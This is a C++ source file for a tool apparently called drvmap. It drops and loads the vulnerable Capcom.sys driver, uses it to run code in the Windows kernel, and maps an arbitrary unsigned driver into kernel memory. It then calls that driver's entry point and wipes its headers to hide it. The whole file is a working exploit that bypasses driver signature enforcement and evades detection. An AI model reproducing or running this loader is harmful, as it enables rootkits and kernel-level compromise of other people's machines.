#include <cstdio>
#include "drv_image.hpp"
#include "util.hpp"
#include "capcom.hpp"
#include "structs.hpp"
#include "loader.hpp"
#include "capcomsys.hpp"
#include <cassert>

#pragma comment(lib, "capcom.lib")

constexpr auto page_size = 0x1000u;

int __stdcall main(const int argc, char** argv)
{
	if (argc != 2)
	{
		printf("usage: drvmap.exe <driver>\n");
		return 0;
	}

	bool capcomload = loader::load_vuln_driver((uint8_t*)capcom_sys, sizeof(capcom_sys), L"C:\\Windows\\Capcom.sys", L"Capcom");
	printf("[+] loaded capcom driver: %i\n", capcomload);
	
	const auto capcom = std::make_unique<capcom::capcom_driver>();

	const auto _get_module = [&capcom](std::string_view name)
	{
		return capcom->get_kernel_module(name);
	};

	const auto _get_export_name = [&capcom](uintptr_t base, const char* name)
	{
		return capcom->get_export(base, name);
	};

	const std::function<uintptr_t(uintptr_t, uint16_t)> _get_export_ordinal = [&capcom](uintptr_t base, uint16_t ord)
	{
		return capcom->get_export(base, ord);
	};
	sizeof(SYSTEM_INFORMATION_CLASS::SystemBasicInformation);
	std::vector<uint8_t> driver_image;
	drvmap::util::open_binary_file(argv[1], driver_image);
	drvmap::drv_image driver(driver_image);

	const auto kernel_memory = capcom->allocate_pool(driver.size(), kernel::NonPagedPool, true);

	assert(kernel_memory != 0);

	printf("[+] allocated 0x%llX bytes at 0x%I64X\n", driver.size(), kernel_memory);
	
	driver.fix_imports(_get_module, _get_export_name, _get_export_ordinal);

	printf("[+] imports fixed\n");

	driver.map();

	printf("[+] sections mapped in memory\n");

	driver.relocate(kernel_memory);

	printf("[+] relocations fixed\n");
	
	const auto _RtlCopyMemory = capcom->get_system_routine<drvmap::structs::RtlCopyMemoryFn>(L"RtlCopyMemory");
	
	const auto size = driver.size();
	const auto source = driver.data();
	const auto entry_point = kernel_memory + driver.entry_point();

	capcom->run([&kernel_memory, &source, &size, &_RtlCopyMemory](auto get_mm)
	{
		_RtlCopyMemory((void*)kernel_memory, source, size);
	});

	printf("[+] calling entry point at 0x%I64X\n", entry_point);

	auto status = STATUS_SUCCESS;

	capcom->run([&entry_point, &status, &kernel_memory, &size](auto mm_get) {
		using namespace drvmap::structs;
		status = ((PDRIVER_INITIALIZE)entry_point)((_DRIVER_OBJECT*)kernel_memory, (PUNICODE_STRING)size);
	});

	if(NT_SUCCESS(status))
	{
		printf("[+] successfully created driver object!\n");

		const auto _RtlZeroMemory = capcom->get_system_routine<drvmap::structs::RtlZeroMemoryFn>(L"RtlZeroMemory");
		const auto header_size = driver.header_size();

		capcom->run([&_RtlZeroMemory, &kernel_memory, &header_size](auto mm_get) {
			_RtlZeroMemory((void*)kernel_memory, header_size);
		});

		printf("[+] wiped headers!\n");
	} 
	else
	{
		printf("[-] creating of driver object failed! 0x%I32X\n", status);

	}

	capcom->close_driver_handle();
	capcomload = loader::unload_vuln_driver(L"C:\\Windows\\Capcom.sys", L"Capcom");
	printf("[+] unloaded capcom driver: %i\n", capcomload);

	return 0;
}